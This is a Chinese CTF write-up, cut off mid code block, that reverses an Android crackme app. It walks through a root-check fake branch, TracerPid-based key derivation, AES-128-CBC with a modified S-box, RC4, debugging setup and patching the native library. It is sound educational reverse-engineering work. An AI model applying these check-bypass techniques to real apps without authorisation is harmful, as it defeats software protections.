alt="image-20210830093939955"></p><p>其中，上面的JNI_Onload根据sub_7079FF9BBC函数的返回值注册不同的函数。</p><p>看到sub_7079FF9BBC：它通过查看<strong>/data/local/su</strong>是否存在，也就是判断我们的运行环境中有没有root</p><p><img src="https://i.loli.net/2021/09/01/rX5yIGZRMNAvmuB.png" alt="image-20210830094108535"></p><p>所以JNI_Onload是根据运行环境是否root注册不同的函数来执行。</p><p>接着我把程序在root与非root手机运行来看一下，root下运行随便输入后显示：<strong>fake branch</strong>，而在非root的手机上运行随便输入后显示：<strong>failed,please try again!!!</strong>，以此可以得出，我们要分析的非root才注册的函数。</p><p>然后也去看了一下root下注册的假流程：经过上面一些加密后最终都是返回同一个字符串。</p><p><img src="https://i.loli.net/2021/09/01/EyKpMnfreXzmAiT.png" alt="image-20210830094927683"></p><p>查看返回的字符串，发现并不是字符串数据，从交叉引用发现.init_array中一些初始化函数对其进行了解密。</p><p><img src="https://i.loli.net/2021/09/01/Xf1RIjZmrEdPyag.png" alt="image-20210830095445346"></p><p>并且.init_array中初始化函数动态解密了程序中很多数据：</p><p><img src="https://i.loli.net/2021/09/01/RKC9vtMTyBU7L1q.png" alt="image-20210830095630836"></p><p>对上面假流程返回的字符串异或0x6d解密后得到：fake branch</p><p><img src="https://i.loli.net/2021/09/01/PfgNijUFCT9zAOS.png" alt="image-20210830095730148"></p><p>再看到正确分支流程：先异或解密一些数据后注册了如下的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">jstring __<span class="function">fastcall <span class="title">sub_7079FF9134</span><span class="params">(JNIEnv *a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// x21</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// x21</span></span><br><span class="line">  __int64 v8; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// x1</span></span><br><span class="line">  __int64 v10; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// w0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v12; <span class="comment">// x1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v13; <span class="comment">// x1</span></span><br><span class="line">  jstring v14; <span class="comment">// x19</span></span><br><span class="line">  _BYTE v16[<span class="number">56</span>]; <span class="comment">// [xsp-30h] [xbp-170h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v17[<span class="number">2</span>]; <span class="comment">// [xsp+8h] [xbp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [xsp+18h] [xbp-128h]</span></span><br><span class="line">  __int128 v19; <span class="comment">// [xsp+20h] [xbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20[<span class="number">2</span>]; <span class="comment">// [xsp+38h] [xbp-108h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v21; <span class="comment">// [xsp+48h] [xbp-F8h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [xsp+F8h] [xbp-48h]</span></span><br><span class="line"></span><br><span class="line">  v22 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  strcpy_0(v17, (<span class="keyword">char</span> *)&amp;xmmword_707A02F0A0);</span><br><span class="line">  v5 = (*a1)-&gt;GetStringUTFChars(a1, a3, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (*a1)-&gt;GetStringLength(a1, (jstring)a3) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (_BYTE *)<span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">0x21</span>uLL);</span><br><span class="line">    __strcpy_chk(v6, v5, <span class="number">33L</span>L);</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">0x1E</span>uLL);</span><br><span class="line">    sub_7079FF9E80();</span><br><span class="line">    v8 = __strlen_chk(v7, <span class="number">0x1E</span>u);</span><br><span class="line">    v7[(<span class="keyword">int</span>)v8] = <span class="number">102</span>;</span><br><span class="line">    v7[((v8 &lt;&lt; <span class="number">32</span>) + <span class="number">0x100000000</span>LL) &gt;&gt; <span class="number">32</span>] = <span class="number">108</span>;</span><br><span class="line">    v7[((v8 &lt;&lt; <span class="number">32</span>) + <span class="number">0x200000000</span>LL) &gt;&gt; <span class="number">32</span>] = <span class="number">103</span>;</span><br><span class="line">    v7[((v8 &lt;&lt; <span class="number">32</span>) + <span class="number">0x300000000</span>LL) &gt;&gt; <span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">    v19 = xmmword_707A01E5D0;</span><br><span class="line">    sub_7079FFA934((__int64)v20, v7, (<span class="keyword">long</span> <span class="keyword">double</span> *)&amp;v19);</span><br><span class="line">    sub_7079FFAE6C(v20, v6, <span class="number">0x20</span>uLL);</span><br><span class="line">    strcpy_0(v20, (<span class="keyword">char</span> *)&amp;qword_707A02F058);</span><br><span class="line">    <span class="keyword">if</span> ( (v20[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v9 = v21;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v9 = (<span class="keyword">char</span> *)v20 + <span class="number">1</span>;</span><br><span class="line">    sub_7079FFA624((<span class="keyword">int</span>)&amp;v19, v9);</span><br><span class="line">    v10 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( v16[v10] == stru_707A02F000[<span class="number">0</span>].n128_u8[v10] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v10 == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;aQpyl);</span><br><span class="line">        sub_7079FF9670((<span class="keyword">int</span>)v17, &amp;aQpyl, v11);</span><br><span class="line">        <span class="keyword">if</span> ( (v17[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          v12 = v18;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v12 = (<span class="keyword">char</span> *)v17 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (v17[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v12 = v18;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12 = (<span class="keyword">char</span> *)v17 + <span class="number">1</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">    v14 = (*a1)-&gt;NewStringUTF(a1, v12);</span><br><span class="line">    <span class="keyword">if</span> ( (v20[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v21)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v17[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v13 = v18;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v13 = (<span class="keyword">char</span> *)v17 + <span class="number">1</span>;</span><br><span class="line">    v14 = (*a1)-&gt;NewStringUTF(a1, v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v17[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v18)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先简单静态分析一下，开始是判断输入的长度是否为32。</p><p>然后sub_7B4933FE80函数读取某个文件内容经过对比后返回一串字符串：</p><p><img src="https://i.loli.net/2021/09/01/rzbtR2GvBUmy3Mj.png" alt="image-20210831211743715"></p><p>后面接着对上面获取到的字符串进行如下赋值：</p><p><img src="https://i.loli.net/2021/09/01/25lEOhyKdwnDYjA.png" alt="image-20210901101308736"></p><p>其实就是在其末尾加上<strong>flg</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">len = <span class="built_in">strlen</span>(init_key);</span><br><span class="line">init_key[len] = <span class="string">'f'</span>;</span><br><span class="line">init_key[len+<span class="number">1</span>] = <span class="string">'l'</span>;</span><br><span class="line">init_key[len+<span class="number">2</span>] = <span class="string">'g'</span>;</span><br><span class="line">init_key[len+3] = '\x0';</span><br></pre></td></tr></table></figure><p>接着sub_7B49340934函数传入两个参数，其中的sub_7B49340820函数用了传入的一个参数串进行aes的密钥扩展：字节替换（但是这里的sbox是替换过的），移位，轮常数异或。44/4 = 11，这也说明了是aes_128，因为密钥11组。</p><p><img src="https://i.loli.net/2021/09/01/51NxLIjvF3lfT8X.png" alt="image-20210831212018020"></p><p>再是将另外一个参数存放在扩展密钥的尾部：</p><p><img src="https://i.loli.net/2021/09/01/Aoj8Q4YzOI5EPfX.png" alt="image-20210831212902803"></p><p>接着的sub_7B49340E6C函数也是很明显的aes_128_cbc加密，sub_7B4934097C中清晰的初始轮（轮密钥加），重复轮（字节替换，行移位，列混合，轮密钥加），最终轮（字节替换，行移位，轮密钥加）结构：</p><p><img src="https://i.loli.net/2021/09/01/MvGDm9iFVQZ1bBr.png" alt="image-20210831213127999"></p><p>最后sub_7B49340624函数rc4加密，但多异或了0x50：</p><p><img src="https://i.loli.net/2021/09/01/mc8Uue5BGsC7Mpl.png" alt="image-20210831213507809"></p><p>所以整体上本题的加密就是aes_128_cbc与rc4，麻烦的是数据部分，如aes的密钥，iv，rc4密钥与密文等。因为开始说了在.init_array中进行了很多数据的解密，我在静态分析看到的大多数数据都是没有解密的。那我们现在要么对分析到的数据找到引用修改的.init_array中的函数按照相同的运算逻辑手动patch修改；要么就是把程序调试起来，分析起来会简单很多。</p><p>这里我选择了动态调试。</p><p>首先将AndroidMannifest.xml中的<strong>android:extractNativeLibs=”false“</strong>改为true或者删掉，默认为true。因为这个如果为false会让我们在调试时找不到so</p><p><img src="https://i.loli.net/2021/09/01/Em4jeAbICkqVFuY.png" alt="image-20210831214326864"></p><p>然后因为我们调试的断点要断在<strong>JNI_OnLoad</strong>中（方便把注册的函数修改为正确的分支），那我们必须在程序还没执行<strong>System.loadLibrary(“native-lib”);</strong>之前就断下来，所以要程序要以调试模式启动。</p><p>首先我尝试了ida+jdb的组合：</p><blockquote><p>运行环境中root模式启动好相应的服务程序，转发端口到本地。(停止转发端口：<strong>adb forward –remove tcp:端口号<code>或</code>adb forward –remove-all</strong>)</p><p>使用am命令以调试启动app：adb shell am start -D -n come.wmctf.crackme111/.MainActivity</p><p>ida在JNI_OnLoad中下好断点，然后找到app对应的进程后附加，接着F9运行</p><p>打开ddms，用附加让app运行起来：jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</p></blockquote><p>但是这样做在jdb附加app就报如下的错误。这好像是我手机的原因？</p><p><img src="https://i.loli.net/2021/09/01/AapBzxRw2Uv8Y9u.png" alt="image-20210831215551116"></p><p>我使用jeb来附加app同样也是报错，这都是在我先用IDA附加了进程的情况下，接着我尝试发现先jdb或jeb附加再IDA附加是可以的，但这样程序已经运行过<strong>System.loadLibrary(“native-lib”);</strong>了。</p><p>而还有一个方法，我们可以使用jeb附加调试断在<strong>System.loadLibrary(“native-lib”);</strong>之前再用IDA去附加进程呀。</p><p><img src="https://i.loli.net/2021/09/01/nshTY1NwpkPWFSr.png" alt="image-20210901095150285"></p><p>然后成功断在JNI_OnLoad中，在正确分支下好断点，修改检测环境是否root的返回值为false，但是这个在native层运行完JNI_OnLoad函数回到java层的时候app又崩溃了。</p><p>最后干脆直接改so得了，就是把根据检测运行环境是否有su的返回值后的条件跳转改一下。</p><p><img src="https://i.loli.net/2021/09/01/zOmXTFrq483bZoM.png" alt="image-20210831234611072"></p><p>上面修改完后，把app重编译一下，然后普通的附加调试就好了。这也是调试本程序最简单的方法，上面绕了一大圈😂。</p><p>现在再看一下内存中解密后的数据，一目了然：<br><img src="https://i.loli.net/2021/09/01/AnKeum1spg8UWMC.png" alt="image-20210901000802876"></p><p>看到上面静态分析说的sub_7B4933FE80函数用fopen()打开了一个系统文件，现在调试过去发现原来是进程的状态信息：</p><p><img src="https://i.loli.net/2021/09/01/VdKjhXruy57g24C.png" alt="image-20210901002119587"></p><p>再看到后面要匹配的内容。</p><p><img src="https://i.loli.net/2021/09/01/ZI4FVAJx73hXOsT.png" alt="image-20210901002413399"></p><p>自己手动查看一下：</p><p><img src="https://i.loli.net/2021/09/01/2mdSZn8XcskBUFN.png" alt="image-20210901002729639"></p><p>接着直接调试到最后看获取的结果，就是要获取<strong>TracerPid:</strong>字段那一行的内容加上flg，而app正常不调试运行这个TracerPid是0的，所以这里获取的正确值为：<strong>TracerPid:\x090\x0Aflg</strong></p><p><img src="https://i.loli.net/2021/09/01/ZgiXE5c3qsU7u8D.png" alt="image-20210901003148346"></p><p>接着看到下面与上面的静态分析结合可以知道：程序中aes_128的key：<strong>TracerPid:\x090\x0Aflg</strong> iv：<strong>0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xA, 0xB, 0xC, 0xD, 0xE, 0xF</strong></p><p><img src="https://i.loli.net/2021/09/01/OFP17jzvpDQymXi.png" alt="image-20210901004032836"></p><p>再就是这个aes加密的sbox果然是替换了的，正常的sbox开头为：<strong>0x63, 0x7c, 0x77, 0x7b</strong></p><p><img src="https://i.loli.net/2021/09/01/J3vIc89jB15GXWh.png" alt="image-20210901004538811"></p><p>最后看到剩下的rc4加密，从传入参数看到密钥是<strong>Hello from C++</strong></p><p>下面开始解密。</p><p>首先rc4解密：</p><p>直接把输入的aes加密结果与最终经过rc4结果都提取出来异或一下得到异或序列，再将其与真正的密文异或一下得到真正的aes加密结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">0xA4</span>, <span class="number">0xCD</span>, <span class="number">0xDA</span>, <span class="number">0x34</span>, <span class="number">0xA9</span>, <span class="number">0xE8</span>, <span class="number">0xFF</span>, <span class="number">0x48</span>, <span class="number">0xD6</span>, <span class="number">0x74</span>, <span class="number">0xE7</span>, <span class="number">0x0F</span>, <span class="number">0x71</span>, <span class="number">0xF7</span>, <span class="number">0xED</span>, <span class="number">0xB7</span>, <span class="number">0xC2</span>, <span class="number">0xA8</span>, <span class="number">0xE1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x2D</span>, <span class="number">0xD0</span>, <span class="number">0x8D</span>, <span class="number">0xF8</span>, <span class="number">0x20</span>, <span class="number">0x0E</span>, <span class="number">0x85</span>, <span class="number">0x1D</span>, <span class="number">0xBC</span>, <span class="number">0xC1</span>, <span class="number">0x61</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">0x6C</span>, <span class="number">0xDB</span>, <span class="number">0xC6</span>, <span class="number">0x75</span>, <span class="number">0x4A</span>, <span class="number">0x94</span>, <span class="number">0xAA</span>, <span class="number">0xBD</span>, <span class="number">0xF5</span>, <span class="number">0x92</span>, <span class="number">0xCF</span>, <span class="number">0xB6</span>, <span class="number">0x4E</span>, <span class="number">0x0B</span>, <span class="number">0x38</span>, <span class="number">0x5B</span>, <span class="number">0x2E</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0xFD</span>, <span class="number">0xE2</span>, <span class="number">0x7B</span>, <span class="number">0xE3</span>, <span class="number">0xFE</span>, <span class="number">0x64</span>, <span class="number">0x7E</span>, <span class="number">0xEA</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0x8D</span>, <span class="number">0x96</span>, <span class="number">0xF5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [s[i]^t[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">200</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">65</span>, <span class="number">227</span>, <span class="number">124</span>, <span class="number">85</span>, <span class="number">245</span>, <span class="number">35</span>, <span class="number">230</span>, <span class="number">40</span>, <span class="number">185</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">213</span>, <span class="number">236</span>, <span class="number">236</span>, <span class="number">231</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">236</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">115</span>, <span class="number">156</span>, <span class="number">94</span>, <span class="number">228</span>, <span class="number">34</span>, <span class="number">168</span>, <span class="number">49</span>, <span class="number">87</span>, <span class="number">148</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = [<span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xEB</span>, <span class="number">0x87</span>, <span class="number">0x76</span>, <span class="number">0x3E</span>, <span class="number">0x77</span>, <span class="number">0x08</span>, <span class="number">0xC0</span>, <span class="number">0x8D</span>, <span class="number">0x56</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x35</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x6A</span>, <span class="number">0x14</span>, <span class="number">0x9D</span>, <span class="number">0x4F</span>, <span class="number">0x1C</span>, <span class="number">0x64</span>, <span class="number">0x21</span>, <span class="number">0x7D</span>, <span class="number">0x78</span>, <span class="number">0xBA</span>, <span class="number">0x53</span>, <span class="number">0x91</span>, <span class="number">0x22</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res = [ans[i]^enc[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res</span><br><span class="line">[<span class="number">208</span>, <span class="number">96</span>, <span class="number">247</span>, <span class="number">198</span>, <span class="number">149</span>, <span class="number">66</span>, <span class="number">34</span>, <span class="number">253</span>, <span class="number">227</span>, <span class="number">107</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">161</span>, <span class="number">201</span>, <span class="number">216</span>, <span class="number">250</span>, <span class="number">207</span>, <span class="number">130</span>, <span class="number">200</span>, <span class="number">118</span>, <span class="number">248</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">248</span>, <span class="number">127</span>, <span class="number">153</span>, <span class="number">90</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">198</span>, <span class="number">182</span>]</span><br></pre></td></tr></table></figure><p>然后aes解密：</p><p>将之前自己写过的aes_cbc加解密中的sbox替换为程序中的，rsbox简单对sbox求一下逆，最后解密即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//aes.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> AES_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AES_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Nk 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Nr 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Nb 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getSBoxValue(num) (sbox[(num)])</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aes</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ctx_</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> RoundKey[<span class="number">11</span>*<span class="number">16</span>];</span><br><span class="line">    &#125;ctx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    aes(<span class="keyword">char</span> *Key);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">xor_iv</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">KeyExpansion</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *RoundKey, <span class="keyword">char</span> *Key)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *RoundKey)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SubBytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ShiftRows</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getData</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data)[<span class="number">4</span>], <span class="keyword">char</span> *enc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">encryption_cbc</span><span class="params">(<span class="keyword">char</span> *plaint, <span class="keyword">char</span> *enc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InvSubBytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InvShiftRows</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InvMixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state)[<span class="number">4</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decryption_cbc</span><span class="params">(<span class="keyword">char</span> *plaint, <span class="keyword">char</span> *enc)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// AES_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 